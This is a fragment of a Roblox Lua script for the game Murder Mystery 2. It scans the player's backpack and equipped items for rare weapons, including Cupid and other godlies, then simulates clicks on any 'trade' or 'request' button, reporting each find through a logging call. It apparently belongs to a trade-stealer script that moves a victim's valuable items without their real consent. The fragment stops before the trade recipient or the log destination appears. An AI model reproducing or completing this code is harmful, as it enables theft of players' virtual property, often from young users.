-- ============================================
-- ITEM DETECTION FOR MM2 (INCLUDING CUPID)
-- ============================================

-- Set to true to trade ALL items, false for only rare items
local TRADE_ALL_ITEMS = false  -- Set to true if you want to trade everything

-- MM2 Legendary, Godly, Ancient, Unique items (including Cupid)
local RARE_ITEMS = {
    -- Godlies
    "Chroma", "Godly", "Elderwood", "Hallows", "Battle", "Cane", "Luger",
    "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard", "Fang",
    "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
    "Virtual", "Xmas", "Minty", "Logchopper", "Candy", "Sweet", "Heart",
    "Corrupt", "Icebreaker", "Hallow", "Bat", "Boneblade",
    -- Ancient
    "Ancient", "Hallow", "Hallowgun", "Hallowblade",
    -- Unique (including Cupid!)
    "Cupid", "Unique", "Valentine", "Heartblade", "Love",
    -- Legendaries
    "Icewing", "Ice Wing", "Ghostblade", "Viper", "Shadow", "Phantom",
    "Bio Blade", "Frost Saber", "Snowflake", "Frostbite", "Winter's Edge",
    "Legendary"
}

local function isRareItem(item)
    if not item or not item:IsA("Tool") then return false end
    
    if TRADE_ALL_ITEMS then
        return true
    end
    
    local itemName = item.Name
    for _, rareName in pairs(RARE_ITEMS) do
        if itemName:find(rareName) or itemName:lower():find(rareName:lower()) then
            return true
        end
    end
    return false
end

-- Get all tradable items from inventory
local function getTradableItems()
    local items = {}
    local itemNames = {}
    
    -- Check backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and isRareItem(item) then
            if not itemNames[item.Name] then
                itemNames[item.Name] = true
                table.insert(items, item)
                sendLog("📦 Found in backpack: " .. item.Name)
            end
        end
    end
    
    -- Check character (held items)
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and isRareItem(item) then
                if not itemNames[item.Name] then
                    itemNames[item.Name] = true
                    table.insert(items, item)
                    sendLog("📦 Found equipped: " .. item.Name)
                end
            end
        end
    end
    
    return items
end

-- ============================================
-- TRADE FUNCTIONS (Using Click Simulation)
-- ============================================

local function clickButton(button)
    if not button then return false end
    pcall(function()
        button:Fire("MouseButton1Click")
        button:Fire("Activated")
        VirtualUser:ClickButton(button)
        VirtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0)
        wait(0.1)
        VirtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)
    end)
    return true
end

local function findAndClickTradeButton()
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                local buttonText = (gui.Text or gui.Name or ""):lower()
                if buttonText:find("trade") or buttonText:find("request") then
                    clickButton(gui)
                    sendLog("📤 Clicked trade request")
                    return true
                end
            end
        end
    end)
    return false
end

